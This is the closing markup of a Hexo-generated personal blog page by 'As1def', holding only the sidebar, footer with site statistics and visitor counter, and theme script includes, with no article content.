        <a href="https://twitter.com/brianchen2006" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;brianchen2006" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa ||fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">As1def</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">162k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">2:28</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

<div class="powered-by">
<i class="fa fa-user-md"></i>
<span id="busuanzi_container_site_uv">
本站总访客数:<span id="busuanzi_value_site_uv"></span>&nbsp;&nbsp;| 
</span>
<span id="busuanzi_container_site_pv">
  &nbsp;本站总访问量<span id="busuanzi_value_site_pv"></span>次
</span>
</div>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>


  <script defer src="/lib/three/three.min.js"></script>


  




  
<script src="/js/local-search.js"></script>













  

  


<script type="text/javascript" src="/js/firework.js"></script>
</body>
</html>
